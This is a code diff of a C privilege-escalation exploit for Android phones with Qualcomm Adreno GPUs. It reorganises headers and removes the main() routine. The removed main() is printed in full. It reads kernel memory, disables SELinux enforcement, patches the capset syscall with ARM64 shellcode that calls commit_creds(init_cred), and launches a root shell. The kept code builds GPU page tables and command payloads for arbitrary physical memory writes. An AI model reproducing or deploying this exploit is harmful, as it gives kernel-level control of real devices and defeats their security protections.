@@ -1,5 +1,7 @@
 #define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
 
+
+
 #include <stdint.h>
 #include <stdlib.h>
 #include <stdio.h>
@@ -13,8 +15,58 @@
 #include <stdbool.h>
 #include <sys/wait.h>
 #include <sys/capability.h>
+#include "cheese.h"
+#include "kallsyms_lookup.h"
 
 #define KGSL_MEMFLAGS_IOCOHERENT 0x80000000ULL
+#define KGSL_MEMFLAGS_GPUREADONLY 0x01000000U
+
+const uint64_t kFakeGpuAddr = 0x40403000;
+const uint64_t kGarbageSize = 16 * 1024 * 1024;
+const uint64_t kKernelPageTableEntry = 0x1e0;
+
+// TODO(zhuowei): make 2G spray configurable; should be ~1/4 to 1/2 of RAM
+// increased this from 1G to 2G for Pixel 3 XL
+// spray 16mb per mapping: 16MB*256=4GB
+#define NPBUFS 256
+
+#define LEVEL1_SHIFT    30
+#define LEVEL1_MASK     (0x1fful << LEVEL1_SHIFT)
+
+#define LEVEL2_SHIFT    21
+#define LEVEL2_MASK     (0x1ff << LEVEL2_SHIFT)
+
+#define LEVEL3_SHIFT    12
+#define LEVEL3_MASK     (0x1ff << LEVEL3_SHIFT)
+
+#define ENTRY_VALID     3
+#define ENTRY_RW        (1 << 6)
+
+/* Normal Non-Cacheable memory */
+#define ENTRY_MEMTYPE_NNC   (3 << 2)
+
+/* "outer attributes are exported from the processor to the external memory bus
+ * and are therefore potentially used by cache hardware external to the core or
+ * cluster" */
+#define ENTRY_OUTER_SHARE (2 << 8)
+
+/* Active */
+#define ENTRY_AF (1<<10)
+
+/* Non-Global */
+#define ENTRY_NG (1<<11)
+
+#define CP_WAIT_MEM_WRITES 0x12
+#define CP_SET_DRAW_STATE 0x43
+#define CP_SET_MODE 0x63
+#define CP_INDIRECT_BUFFER 0x3f
+#define DRAW_STATE_MODE_BINNING 0x1
+#define DRAW_STATE_MODE_GMEM 0x2
+#define DRAW_STATE_MODE_BYPASS 0x4
+#define DRAW_STATE_DIRTY (1 << 16)
+#define CP_SMMU_TABLE_UPDATE 0x53
+#define CP_CONTEXT_SWITCH_YIELD 0x6b
+
 
 // from adrenaline.cpp:
 // https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html
@@ -45,7 +97,6 @@ int kgsl_ctx_destroy(int fd, uint32_t ctx_id) {
     return ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &req);
 }
 
-#define KGSL_MEMFLAGS_GPUREADONLY 0x01000000U
 
 /* modified version of kilroy's kgsl_map. the choice to use KGSL_MEMFLAGS_USE_CPU_MAP
  * comes from earlier debugging efforts, but a normal user mapping should work as well,
@@ -115,36 +166,6 @@ int kgsl_gpu_command_payload(int fd, uint32_t ctx_id, uint64_t gpuaddr, uint32_t
     return err;
 }
 
-// TODO(zhuowei): make 2G spray configurable; should be ~1/4 to 1/2 of RAM
-// increased this from 1G to 2G for Pixel 3 XL
-// spray 16mb per mapping: 16MB*256=4GB
-#define NPBUFS 256
-
-#define LEVEL1_SHIFT    30
-#define LEVEL1_MASK     (0x1fful << LEVEL1_SHIFT)
-
-#define LEVEL2_SHIFT    21
-#define LEVEL2_MASK     (0x1ff << LEVEL2_SHIFT)
-
-#define LEVEL3_SHIFT    12
-#define LEVEL3_MASK     (0x1ff << LEVEL3_SHIFT)
-
-#define ENTRY_VALID     3
-#define ENTRY_RW        (1 << 6)
-
-/* Normal Non-Cacheable memory */
-#define ENTRY_MEMTYPE_NNC   (3 << 2)
-
-/* "outer attributes are exported from the processor to the external memory bus
- * and are therefore potentially used by cache hardware external to the core or
- * cluster" */
-#define ENTRY_OUTER_SHARE (2 << 8)
-
-/* Active */
-#define ENTRY_AF (1<<10)
-
-/* Non-Global */
-#define ENTRY_NG (1<<11)
 
 int setup_pagetables(uint8_t *tt0, uint32_t pages, uint32_t tt0phys, uint64_t fake_gpuaddr, uint64_t target_pa) {
     uint64_t *level_base;
@@ -214,7 +235,6 @@ tu_get_l1_dcache_size()
    return 4 << ((ctr_el0 >> 16) & 0xf);
 }
 
-static uint64_t g_level1_dcache_size;
 
 static void sync_cache_to_gpu(void* start, void* end) {
     start = (char *) ((uintptr_t) start & ~(g_level1_dcache_size - 1));
@@ -244,37 +264,10 @@ uint64_t GetPhys(int pagemap_fd, uint64_t virt) {
 }
 #endif
 
-#define CP_WAIT_MEM_WRITES 0x12
-#define CP_SET_DRAW_STATE 0x43
-#define CP_SET_MODE 0x63
-#define CP_INDIRECT_BUFFER 0x3f
-#define DRAW_STATE_MODE_BINNING 0x1
-#define DRAW_STATE_MODE_GMEM 0x2
-#define DRAW_STATE_MODE_BYPASS 0x4
-#define DRAW_STATE_DIRTY (1 << 16)
-#define CP_SMMU_TABLE_UPDATE 0x53
-#define CP_CONTEXT_SWITCH_YIELD 0x6b
-
 uint64_t cheese_decode_adrp(uint32_t instr, uint64_t pc);
 
-struct cheese_gpu_rw {
-    int fd;
-    uint32_t ctx_id;
 
-    uint32_t* payload_buf;
-    uint64_t payload_gpuaddr;
-    uint32_t* output_buf;
-    uint64_t output_gpuaddr;
 
-    void* target_physical_page;
-
-    uint64_t phyaddr;
-
-    void* garbage;
-};
-
-const uint64_t kFakeGpuAddr = 0x40403000;
-const uint64_t kGarbageSize = 16 * 1024 * 1024;
 
 static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_gpuaddr, uint64_t phyaddr, uint64_t completion_marker_write_addr, bool write, uint64_t write_addr, uint32_t count, uint32_t* values) {
     uint32_t* drawstate_buf = payload_buf + 0x100;
@@ -345,8 +338,6 @@ static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_g
     }
     return 0;
 }
-
-const uint64_t kKernelPageTableEntry = 0x1e0;
 
 int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
 #ifdef DUMP_PAGEMAP
@@ -633,10 +624,9 @@ int cheese_shutdown(struct cheese_gpu_rw* cheese) {
     return 0;
 }
 
-#define KALLSYMS_LOOKUP_INCLUDE
-#include "kallsyms_lookup.c"
+//#define KALLSYMS_LOOKUP_INCLUDE
 
-static void stupid_memcpy(void* dst, const void* src, size_t count) {
+void stupid_memcpy(void* dst, const void* src, size_t count) {
     char* d = dst;
     const char* s = src;
     for (size_t c = 0; c < count; c++) {
@@ -649,124 +639,4 @@ void stupid_setexeccon(const char* con) {
     int fd = open("/proc/thread-self/attr/exec", O_RDWR|O_CLOEXEC);
     write(fd, con, strlen(con) + 1);
     close(fd);
-}
-
-int main() {
-    g_level1_dcache_size = tu_get_l1_dcache_size();
-#if 1
-    if (!getenv("CHEESE_SKIP_GPU")) {
-        struct cheese_gpu_rw cheese = {};
-        if (cheese_gpu_rw_setup(&cheese)) {
-            fprintf(stderr, "can't get GPU r/w\n");
-            return 1;
-        }
-    }
-#endif
-    // now check ksma...
-    fprintf(stderr, "about to ksma...\n");
-    void* ksma_mapping = (void*)(0xffffff8000000000ull + kKernelPageTableEntry * 0x40000000ull);
-    uint64_t ksma_physical_base = 0x80000000;
-    //sync_cache_from_gpu(ksma_mapping + 0x08000000, ksma_mapping + 0x08000000 + 0x1000);
-    uint32_t* mytarget = ksma_mapping - ksma_physical_base + 0xa8000000 + 0x38 /* kernel header magic: ARMd */;
-    fprintf(stderr, "%p=%x\n", mytarget, *mytarget);
-    uint64_t* kernel_size_ptr = ksma_mapping - ksma_physical_base + 0xa8000000 + 0x10 /* kernel header: size */;
-    uint64_t kernel_size = *kernel_size_ptr;
-    void* kernel_physical_base = ksma_mapping - ksma_physical_base + 0xa8000000;
-
-    void* kernel_copy_buf = malloc(kernel_size);
-    memcpy(kernel_copy_buf, kernel_physical_base, kernel_size);
-    if (getenv("CHEESE_DUMP_KERNEL")) {
-        FILE* f = fopen("/data/local/tmp/kernel_dump", "w");
-        fwrite(kernel_copy_buf, 1, kernel_size, f);
-        fclose(f);
-    }
-
-    struct cheese_kallsyms_lookup kallsyms_lookup;
-    if (cheese_create_kallsyms_lookup(&kallsyms_lookup, kernel_copy_buf, kernel_size)) {
-        return 1;
-    }
-
-    const bool force_manual_patchfinder = false;
-
-    // TODO(zhuowei): this is dumped from vmlinux-to-elf/kallsyms-finder on my computer and is specific to 51052260106700520 - need to auto detect this
-    uint64_t kernel_virtual_base = kallsyms_lookup.text_base;
-    uint64_t kernel_selinux_state_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "selinux_state");
-    if (force_manual_patchfinder || !kernel_selinux_state_addr) {
-        kernel_selinux_state_addr = cheese_lookup_selinux_state(&kallsyms_lookup);
-    }
-    bool* kernel_selinux_state_enforcing_ptr = kernel_physical_base + (kernel_selinux_state_addr - kernel_virtual_base);
-    fprintf(stderr, "%lx: %p\n", (kernel_selinux_state_addr - kernel_virtual_base), kernel_selinux_state_enforcing_ptr);
-    *kernel_selinux_state_enforcing_ptr = false;
-    fprintf(stderr, "set selinux enforcing ptr...\n");
-    __builtin___clear_cache((char*)kernel_selinux_state_enforcing_ptr, (char*)kernel_selinux_state_enforcing_ptr + sizeof(bool));
-
-    uint64_t init_cred_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "init_cred");
-    if (force_manual_patchfinder || !init_cred_addr) {
-        init_cred_addr = cheese_lookup_init_cred(&kallsyms_lookup);
-    }
-    uint64_t commit_creds_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "commit_creds");
-
-#define LO_DWORD(a) (a & 0xffffffff)
-#define HI_DWORD(a) (a >> 32)
-
-    // https://www.longterm.io/cve-2020-0423.html
-    uint32_t shellcode[] = {
-        // commit_creds(init_cred)
-        0x58000040, // ldr x0, .+8
-        0x14000003, // b   .+12
-        LO_DWORD(init_cred_addr),
-        HI_DWORD(init_cred_addr),
-        0x58000041, // ldr x1, .+8
-        0x14000003, // b   .+12
-        LO_DWORD(commit_creds_addr),
-        HI_DWORD(commit_creds_addr),
-        0xA9BF7BFD, // stp x29, x30, [sp, #-0x10]!
-        0xD63F0020, // blr x1
-        0xA8C17BFD, // ldp x29, x30, [sp], #0x10
-
-        0x2A1F03E0, // mov w0, wzr
-        0xD65F03C0, // ret
-    };
-
-    uint64_t kernel___do_sys_capset_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "__do_sys_capset");
-    char* kernel___do_sys_capset_ptr = kernel_physical_base + (kernel___do_sys_capset_addr - kernel_virtual_base);
-
-    /* Saving sys_capset current code */
-    uint8_t sys_capset[sizeof(shellcode)];
-    fprintf(stderr, "save...\n");
-    stupid_memcpy(sys_capset, kernel___do_sys_capset_ptr, sizeof(sys_capset));
-    /* Patching sys_capset with our shellcode */
-    fprintf(stderr, "patch...\n");
-    stupid_memcpy(kernel___do_sys_capset_ptr, shellcode, sizeof(shellcode));
-
-    // https://developer.arm.com/documentation/101430/0102/Functional-description/L1-memory-system/About-the-L1-memory-system/L1-instruction-side-memory-system
-    // "behaves as a PIPT cache" - flushing this will flush all copies sharing same physical memory
-    __builtin___clear_cache(kernel___do_sys_capset_ptr, kernel___do_sys_capset_ptr + sizeof(shellcode));
-
-    fprintf(stderr, "call...\n");
-    /* Calling our patched version of sys_capset */
-    #pragma clang diagnostic push
-    #pragma clang diagnostic ignored "-Wnonnull"
-    int err = capset(NULL, NULL);
-    fprintf(stderr, "called...\n");
-    #pragma clang diagnostic pop
-    if (err) {
-        fprintf(stderr, "capset returned %d\n", err);
-        return 1;
-    }
-    fprintf(stderr, "restore...\n");
-    /* Restoring sys_capset */
-    stupid_memcpy(kernel___do_sys_capset_ptr, sys_capset, sizeof(sys_capset));
-    __builtin___clear_cache(kernel___do_sys_capset_ptr, kernel___do_sys_capset_ptr + sizeof(sys_capset));
-    fprintf(stderr, "restored...\n");
-    if (getuid() != 0) {
-        fprintf(stderr, "failed to get root - rerun?\n");
-        return 1;
-    }
-
-    stupid_setexeccon("u:r:shell:s0"); // otherwise binder doesn't work
-    execl("/system/bin/sh", "sh", NULL);
-    fprintf(stderr, "can't exec?\n");
-
-    return 0;
 }
